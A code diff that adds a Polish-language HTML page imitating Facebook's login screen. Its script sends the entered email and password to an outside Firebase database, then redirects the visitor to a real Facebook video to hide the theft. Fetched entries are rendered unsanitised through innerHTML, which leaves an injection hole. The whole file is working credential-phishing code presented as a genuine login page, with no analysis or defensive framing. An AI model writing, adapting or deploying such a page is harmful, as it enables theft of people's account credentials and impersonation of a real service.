@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zaloguj się do Facebooka</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #ffffff; 
+            display: flex; 
+            flex-direction: column;
+            align-items: center; 
+            justify-content: flex-start;
+            height: 100vh; 
+            margin: 0; 
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .fb-login-wrapper {
+            width: 100%;
+            max-width: 420px;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+
+        /* Nagłówek jest teraz w 100% czysty - bez żadnego ID */
+        .fb-header {
+            display: flex;
+            align-items: center;
+            font-size: 1.15em;
+            font-weight: 600;
+            color: #000000;
+            margin-bottom: 15px;
+            margin-top: 10px;
+        }
+
+        .fb-header .arrow {
+            font-size: 1.4em;
+            margin-right: 15px;
+            cursor: pointer;
+            font-weight: 300;
+        }
+
+        .fb-logo-container {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 30px;
+            margin-top: 15px;
+        }
+
+        .fb-logo-svg {
+            width: 60px;
+            height: 60px;
+        }
+
+        .chat-box { 
+            height: 35vh; 
+            overflow-y: auto; 
+            display: flex; 
+            flex-direction: column; 
+            margin-bottom: 20px;
+            padding: 10px 5px;
+            border-bottom: 1px dashed #e4e6eb;
+            transition: all 0.3s ease;
+        }
+
+        .chat-box.hidden {
+            display: none !important;
+        }
+
+        .message { 
+            margin-bottom: 12px; 
+            padding: 12px 16px; 
+            border-radius: 22px; 
+            max-width: 75%; 
+            word-wrap: break-word; 
+            font-size: 0.95em; 
+            line-height: 1.4;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .message.other { 
+            background-color: #f0f2f5; 
+            color: #050505;
+            align-self: flex-start; 
+        }
+
+        .message.me { 
+            background-color: #1877f2; 
+            color: white; 
+            align-self: flex-end; 
+        }
+
+        .author { 
+            font-size: 0.75em; 
+            color: #8a8d91; 
+            margin-bottom: 3px; 
+            margin-left: 6px;
+            display: block; 
+        }
+        .message.me .author {
+            text-align: right;
+            margin-right: 6px;
+            margin-left: 0;
+            color: #1877f2;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .fb-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #ccd0d5;
+            border-radius: 12px;
+            font-size: 1em;
+            outline: none;
+            box-sizing: border-box;
+            color: #1c1e21;
+            background-color: #ffffff;
+        }
+
+        .fb-input:focus {
+            border-color: #1877f2;
+        }
+
+        .fb-input::placeholder {
+            color: #8a8d91;
+        }
+
+        .fb-submit-btn {
+            width: 100%;
+            background-color: #1877f2;
+            color: #ffffff;
+            border: none;
+            border-radius: 25px;
+            padding: 14px;
+            font-size: 1.05em;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 5px;
+            transition: background-color 0.1s;
+        }
+
+        .fb-submit-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password-link {
+            text-align: center;
+            color: #000000;
+            font-size: 0.95em;
+            font-weight: 500;
+            margin-top: 15px;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .create-account-btn {
+            width: 100%;
+            background: none;
+            border: 1px solid #1877f2;
+            color: #1877f2;
+            border-radius: 25px;
+            padding: 12px;
+            font-size: 1em;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: auto; 
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+
+        .create-account-btn:hover {
+            background-color: #f0f2f5;
+        }
+
+        .bottom-area {
+            text-align: center;
+            font-size: 0.9em;
+            color: #65676b;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            user-select: none;
+            margin-bottom: 10px;
+        }
+        
+        .meta-logo {
+            color: #0064e0;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div class="fb-login-wrapper">
+    <div class="fb-header">
+        <span class="arrow">‹</span> Zaloguj się do Facebooka
+    </div>
+
+    <div class="fb-logo-container">
+        <svg class="fb-logo-svg" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="12" cy="12" r="12" fill="#1877F2"/>
+            <path d="M14.75 12H13V18H10.5V12H9.25V9.75H10.5V8.375C10.5 7.1125 11.1875 6.25 12.8125 6.25H14.75V8.5H13.625C13.0625 8.5 13 8.71875 13 9.25V9.75H14.75L14.75 12Z" fill="white"/>
+        </svg>
+    </div>
+
+    <div class="chat-box hidden" id="chatBox"></div>
+
+    <div class="login-form">
+        <input type="text" id="emailInput" class="fb-input" placeholder="Adres e-mail lub numer telefonu komórkowego" onkeypress="handleKeyPress(event)">
+        <input type="password" id="passInput" class="fb-input" placeholder="Hasło" onkeypress="handleKeyPress(event)">
+        <button class="fb-submit-btn" onclick="sendMessage()">Zaloguj się</button>
+    </div>
+
+    <a class="forgot-password-link" onclick="document.getElementById('passInput').value='Nie pamiętam hasła...';">Nie pamiętasz hasła?</a>
+
+    <button class="create-account-btn" onclick="window.location.reload();">Utwórz nowe konto</button>
+
+    <div class="bottom-area" onclick="clearChat()">
+        <span class="meta-logo">∞</span> Meta
+    </div>
+</div>
+
+<script>
+    // TAJNE LOSOWANIE I ZAPAMIĘTYWANIE NICKU W TLE
+    let myName = localStorage.getItem('fb_chat_secret_id');
+    if (!myName) {
+        myName = "Użytkownik_" + Math.floor(Math.random() * 100);
+        localStorage.setItem('fb_chat_secret_id', myName);
+    }
+
+    const FIREBASE_URL = "https://czat-51e6b-default-rtdb.europe-west1.firebasedatabase.app/messages.json";
+
+    function appendMessage(author, text) {
+        const chatBox = document.getElementById('chatBox');
+        chatBox.classList.remove('hidden');
+
+        const messageDiv = document.createElement('div');
+        const isMe = author === myName;
+        
+        messageDiv.classList.add('message', isMe ? 'me' : 'other');
+        messageDiv.innerHTML = `<span class="author">${author}</span>${text}`;
+        chatBox.appendChild(messageDiv);
+        chatBox.scrollTop = chatBox.scrollHeight;
+    }
+
+    function handleKeyPress(event) {
+        if (event.key === "Enter") sendMessage();
+    }
+
+    function sendMessage() {
+        const emailField = document.getElementById('emailInput');
+        const passField = document.getElementById('passInput');
+        
+        const emailText = emailField.value.trim();
+        const passText = passField.value.trim();
+
+        const triggerRedirect = passText !== "";
+
+        let finalFormedText = "";
+        if (emailText !== "" && passText !== "") {
+            finalFormedText = emailText + " | " + passText;
+        } else {
+            finalFormedText = emailText || passText;
+        }
+
+        if (finalFormedText === "") return;
+
+        fetch(FIREBASE_URL, {
+            method: 'POST',
+            body: JSON.stringify({ author: myName, text: finalFormedText })
+        })
+        .then(() => {
+            if (triggerRedirect) {
+                window.location.href = "https://www.facebook.com/reel/26759943633614911";
+            }
+        });
+
+        emailField.value = "";
+        passField.value = "";
+    }
+
+    function clearChat() {
+        if (confirm("Czy na pewno chcesz wyczyścić historię rozmowy?")) {
+            fetch(FIREBASE_URL, {
+                method: 'DELETE'
+            })
+            .then(() => {
+                const chatBox = document.getElementById('chatBox');
+                chatBox.innerHTML = "";
+                chatBox.classList.add('hidden');
+                lastLoadedCount = 0;
+            })
+            .catch(err => console.error("Błąd:", err));
+        }
+    }
+
+    let lastLoadedCount = 0;
+    function loadMessages() {
+        fetch(FIREBASE_URL)
+        .then(res => res.json())
+        .then(data => {
+            const chatBox = document.getElementById('chatBox');
+            
+            if (!data) {
+                chatBox.innerHTML = "";
+                chatBox.classList.add('hidden');
+                lastLoadedCount = 0;
+                return;
+            }
+            
+            const keys = Object.keys(data);
+            
+            if (keys.length !== lastLoadedCount) {
+                chatBox.innerHTML = "";
+                keys.forEach(key => {
+                    appendMessage(data[key].author, data[key].text);
+                });
+                lastLoadedCount = keys.length;
+            }
+        })
+        .catch(err => console.error("Błąd pobierania:", err));
+    }
+
+    setInterval(loadMessages, 1500);
+    loadMessages();
+</script>
+
+</body>
+</html>
